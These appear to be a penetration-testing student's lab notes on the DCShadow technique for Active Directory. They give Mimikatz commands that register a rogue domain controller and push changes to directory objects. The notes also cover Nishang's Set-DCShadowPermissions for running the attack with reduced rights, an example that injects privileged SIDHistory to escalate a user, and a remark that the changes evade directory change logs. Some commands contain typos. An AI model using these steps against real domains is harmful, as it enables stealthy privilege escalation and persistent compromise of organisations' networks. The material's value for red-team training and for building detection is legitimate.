DCShadow allows an attacker with enough privileges to create a rogue Domain Controller and push changes to the DC Active Directory objects.
- The new DC is registered by modifying the configuration container, SPNs of an existing computer object and couple of RPC services.
- Because the attributes are changed from a "domain controller", there are no directory change logs on the actual DC for target object
*Logs will be there but what is changed using DCShadow wont be there*
- By Default, DA privileges are required to use DCShadow.
- ***If we have domain admin privilege on forest level then only we can use this attack***

Two Instances are required:
***First:***
Start RPC servers with SYSTEM privileges and specify attributes to be modified:
```bash
!+
!processtoken
!sadump::dcshadow /object:root1user /attribute:Description /value:"hello from DCShadow"
```
***Second:***
With enough privileges (DA or Otherwise) to push the values.
```bash
lsadump:dcshadow /push
```

- DCShadow can be used with minimal permissions by modifying ACLs of - 
*We need these permissions.*
	- The domain object.
		- DS-Install-Replica (Add/Remove Replica in Domain)
		- DS-Replication-Manage-Topology (Manage Replication Topology)
		- DS-Replication-Synchronize (Replication Synchornization)
	- The Sites Object (and its children) in the Configuration container.
		- CreateChild and DeleteChild
	- The target object.
		- WriteProperty (Not Write)
- We can use `Set-DCShadowPermissions` from Nishang for setting the permissions.
- For example, to use DCShadow as user student1 to modify root1user object from macchine mcorp-student1.
	`Set-DCShadowPermissions -FakeDC mcorp-student1 -SAMAccountName root1user -Username student1 -Verbose`
	From second machine with DA privileges:
	`lsadump::dcshadow /push`

- Now, the second mimikatz instance (which runs as DA) is not required.


Once we have permissions sorted out, so much of interesting stuff can be done.
For Example: set SIDHistory of a user account to Enterprise Admins or Domain Admins group
`lsadump::dcshadow /object:student1 /attribute:SIDHistory /value:S-1-5-21... `

- To use above without DA:
	`Set-DCShadowPermissions -FakeDC mcorp-student1 -SAMAccountName root1user -Username student1 -Verbose`


## SCShadow - Shadowception
- We can even run DCShadow from DCShadow which I have named Shadowception:
*The permissions that is pushed using `Set-DCShadowPermissions` can also be pushed using DCShadow DC*
